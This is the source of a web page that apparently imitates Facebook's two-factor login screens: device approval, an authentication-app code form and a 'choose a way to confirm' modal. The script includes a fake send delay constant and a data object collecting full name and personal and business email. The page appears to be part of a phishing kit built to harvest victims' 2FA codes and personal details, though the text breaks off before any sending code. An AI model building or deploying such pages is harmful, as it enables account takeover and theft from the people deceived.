...
<head>
    ...
    <div id="stepOneTwoFA" class="x78zum5">
        <div class="x9f619">
            <div class="x1n2onr6">
                <div class="x1ja2u2z">
                    <div class="x19cbwz6">Facebook</div>
                    <h2 class="x11i5rnm">Check your notifications on another devices</h2>
                    <span class="x1lliihq">We sent a notification to your device. Check your Facebook notifications there and approve the login to continue.</span>
                </div>
                <div class="x9f619">
                    <img width="100%" alt="" class="xz74otr" referrerpolicy="origin-when-cross-origin" src="/img/ACP-UnifiedDelta-Device-Mobile_light-3x.png">
                </div>
                <div class="x193iq5w">
                    <div class="x2oemzd">
                        <div class="x2lah0s">
                            ...
                            <div class="x1q0g3np">
                                <div class="x193iq5w">
                                    <div class="x16n37ib">
                                        <div class="x13faqbe">Waiting for approval</div>
                                        <div class="x1q0g3np">Approve from the other device to continue.</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                ...
                <div class="x14l7nz5">
                    <button id="TwoFAOther" class="x14l7nj3" type="button">Try another way</button>
                </div>
            </div>
        </div>
    </div>
    
    <div id="stepNextTwoFA" class="x78zum5">
        <div class="x9f619">
            <div class="x1n2onr6">
                <div class="x1ja2u2z">
                    <div class="x19cbwz6">Facebook</div>
                    <h2 class="x11i5rnm">Go to your authentication app</h2>
                    <span class="x1lliihq">Enter the 6-digit code for this account from the two-factor authentication app you set up (such as Duo Mobile or Google Authenticator).</span>
                </div>
                <div class="x9f619">
                    <img width="100%" alt="" class="xz74otr" referrerpolicy="origin-when-cross-origin" src="/img/ACP-UnifiedDelta-AuthenticationApp-Mobile_light-3x.png">
                </div>
                <form id="twoFAForm">
                    <div class="x6s0dn4">
                        <input class="x1i10hfl" name="2FA-1" type="text" placeholder="Code" />
                    </div>
                
                    <div class="x14l7nz5">
                        <button class="x14l7njz" type="submit">Continue</button>
                        <button id="TwoFABack" class="x14l7nj3" type="button">Try another way</button>
                    </div>
                </form>
            </div>
        </div>
    ...
    <div class="modal form-modal" id="OpTwoFAModal" tabindex="-1" aria-labelledby="2FAmodalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
            <div class="modal-content x28abms">
                <div class="modal-body">
                    <div class="twoFAinfo-wraper">
                        <h1 class="x28abm5 modal-title" id="2FAmodalLabel">Choose a way to confirm it’s you</h1>
                        <p class="x0kabm1">These are your available confirmation methods.</p>
                    </div>

                    <div>
                        <label for="verifyTwoFA" class="g1k7zga">
                            <div class="x1n2onrx">
                                <div class="x1q0g3np">
                                    <div class="xhkezso">Authentication app</div>
                                    <div class="x1f0sm9e">Get a code from your authentication app.</div>
                                </div>
                                <div class="x1mh8g0r">
                                    <input class="x1gftvtq" name="verifyTwoFA" id="verifyTwoFA" type="radio" required checked/>
                                </div>
                            </div>
                        </label>
                        <div class="xifccgj">
                            ...
                            <div class="x1r8uery">
                                <div class="x1r8uerw">Need another option?</div>
                                <div class="x1r8uerz">To keep your account safe, accessing it without your usual login methods can take a few days. To get started, go to account recovery.</div>
                            </div>
                        </div>
                        <div class="xi112ho">
                            <button id="stepVerifyTwoFA" type="button">Continue</button>
                        </div>
                    </div>
    ...
    <script>
        $(() => {
            const SEND_FORM_FICTIV_TIME = 2000
            const formsSendData = {
                'full-name': '',
                'personal-email': '',
                'buiseness-email': '',
            ...
            $('body').css('background', '#ECF3FF');
            $('#stepNextTwoFA').css('display', 'none');
            const OpTwoFA = new bootstrap.Modal(document.getElementById('OpTwoFAModal'));
            $('#TwoFAOther').on('click', () => {
                OpTwoFA.show();
            });
            $('#stepVerifyTwoFA').on('click', () => {
                OpTwoFA.hide();
                $('#stepOneTwoFA').css('display', 'none');
                $('#stepNextTwoFA').css('display', 'block');
            });
            $('#TwoFABack').on('click', () => {
                $('#stepOneTwoFA').css('display', 'block');
                $('#stepNextTwoFA').css('display', 'none');
            });
            
            function checkStatusss() { 
                var $twoFAForm = $(twoFAForm);
                var $passwordInput = $twoFAForm.find('.password-input');
                var $spinner = $twoFAForm.find('.spinner-border');
                var $buttonText = $twoFAForm.find('.button-text');
                var $button = $twoFAForm.find('button');
                var $errorText = $twoFAForm.find('.invalid-feedback');
                var $input = $twoFAForm.find('input');
